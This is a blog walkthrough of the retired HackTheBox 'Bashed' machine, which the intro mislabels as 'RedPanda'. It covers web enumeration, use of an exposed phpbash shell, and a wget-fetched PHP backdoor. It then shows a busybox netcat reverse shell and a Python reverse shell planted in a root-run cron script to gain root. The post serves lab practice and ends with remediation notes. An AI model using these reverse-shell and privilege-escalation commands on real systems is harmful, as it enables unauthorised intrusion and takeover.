---
layout: post
date: 2023-05-16
title: "Bashed Walkthrough"
categories: [hackthebox]
tags: [hackthebox, linux, web, SUDO, Scheduled Job Abuse]
---

This is a walkthrough on how to complete the RedPanda box on Hackthebox.com. This box has been retired. The box is rated as **easy** difficulty. You can attempt the machine [here](https://app.hackthebox.com/machines/118) as well as view their write up on the box. 

Required Skills include: Web enumeration, Linux fundamentals.


I first started out with nmap scan as you must know what is open and what is closed. 

sudo nmap -Pn -n -v -sC -sV --open --min-rate=1000 -oA bashed BashedIP

```shell
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
|_http-title: Arrexel's Development Site
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

added bashed.htb to hosts file so I am able to access the page online.

![](/assets/images/Bashed/mainpage.jpg)

This links to another interesting page with more information relating to the exploit. 

![](/assets/images/Bashed/mainpage2.jpg)

This shows an example of a php file that is on the server, however I do not know that at this point in time. 

![](/assets/images/Bashed/githubpage.jpg)


https://github.com/Arrexel/phpbash


ran feroxbuster

```shell

feroxbuster -u http://bashed.htb/ -k --wordlist=/usr/share/wordlists/dirb/big.txt

```


```shell
404      GET        -l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      161l      397w     7743c http://bashed.htb/
404      GET        9l       34w      296c http://bashed.htb/Documents%20and%20Settings
404      GET        9l       33w      284c http://bashed.htb/contact%20us
301      GET        9l       28w      306c http://bashed.htb/css => http://bashed.htb/css/
301      GET        9l       28w      306c http://bashed.htb/dev => http://bashed.htb/dev/
404      GET        9l       33w      285c http://bashed.htb/donate%20cash
404      GET        9l       33w      288c http://bashed.htb/external%20files
301      GET        9l       28w      308c http://bashed.htb/fonts => http://bashed.htb/fonts/
404      GET        9l       33w      283c http://bashed.htb/home%20page
301      GET        9l       28w      309c http://bashed.htb/images => http://bashed.htb/images/
301      GET        9l       28w      305c http://bashed.htb/js => http://bashed.htb/js/
404      GET        9l       33w      284c http://bashed.htb/modern%20mom
301      GET        9l       28w      306c http://bashed.htb/php => http://bashed.htb/php/
404      GET        9l       33w      288c http://bashed.htb/press%20releases
403      GET       11l       32w      298c http://bashed.htb/server-status
404      GET        9l       33w      287c http://bashed.htb/style%20library
301      GET        9l       28w      310c http://bashed.htb/uploads => http://bashed.htb/uploads/
403      GET       11l       32w      302c http://bashed.htb/uploads/.htaccess
403      GET       11l       32w      302c http://bashed.htb/uploads/.htpasswd
404      GET        9l       34w      304c http://bashed.htb/uploads/Documents%20and%20Settings
404      GET        9l       33w      295c http://bashed.htb/uploads/Program%20Files
404      GET        9l       33w      292c http://bashed.htb/uploads/contact%20us
404      GET        9l       33w      293c http://bashed.htb/uploads/donate%20cash
404      GET        9l       33w      296c http://bashed.htb/uploads/external%20files
404      GET        9l       33w      291c http://bashed.htb/uploads/home%20page
404      GET        9l       33w      292c http://bashed.htb/uploads/modern%20mom
404      GET        9l       33w      292c http://bashed.htb/uploads/my%20project
404      GET        9l       34w      297c http://bashed.htb/uploads/neuf%20giga%20photo
404      GET        9l       33w      296c http://bashed.htb/uploads/press%20releases
404      GET        9l       33w      290c http://bashed.htb/uploads/site%20map
404      GET        9l       33w      295c http://bashed.htb/uploads/style%20library

```


going to this page provides us with a semi-shell which was shown above in the github repo. 

http://bashed.htb/dev/phpbash.php


![](/assets/images/Bashed/phpbash.jpg)


sudo -l

![](/assets/images/Bashed/phpbash2.jpg)

cd .. 

cd uploads/

wget http://10.10.14.7/simple-backdoor.php

http://bashed.htb/uploads/simple-backdoor.php

navigate to that page for further command execution to try and get a full shell.
	this did not work.

I saw that it was running busybox when I typed ls /bin

so I ran this command with my listener running 


```shell
busybox nc 10.10.14.7 4444 -e /bin/bash
```

```shell
nc -lvnp 4444
```


I now have a bad shell as user "www-data" so I  can upgrade with 


```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This enables me to have lateral movement.


```shell
sudo -u scriptmanager /bin/bash
```


I am now the user "scriptmanager".


I attempt to run sudo -l where it asks for a password of which I do not have.



I then travel to /home and see another user. arrexel which I can read his files and thus got the user flag.

![](assets/images/Bashed/shell.jpg)



travelling to / shows me an interesting folder. /scripts which I travel to finding test.py and test.txt

![](/assets/images/Bashed/shell2.jpg)

seeing the files you can see test.py is owned by scriptmanager and test.txt is owned by root.

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```


I read test.py which it creates the test.txt file and thus I can assume that the script is being automated as root. I can then change the file contents of test.py which I uploaded a bash rev shell into test.py

I got this reverse shell from https://revshells.com

```python
import os
import pty
import socket


s=socket.socket()
s.connect(("10.10.14.7",5555))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
pty.spawn("/bin/bash")
```



This gave me a root shell.



![](/assets/images/Bashed/pwned.jpg)



You can secure the exploited vulnerability by first not having an interactive shell built into your webapp. Another step to take is to ensure that you do not have scripts running at elevated levels if unnecessary. To change this, you will need to change who is running the automated job. The permissions seemed to be fine on this machine.  





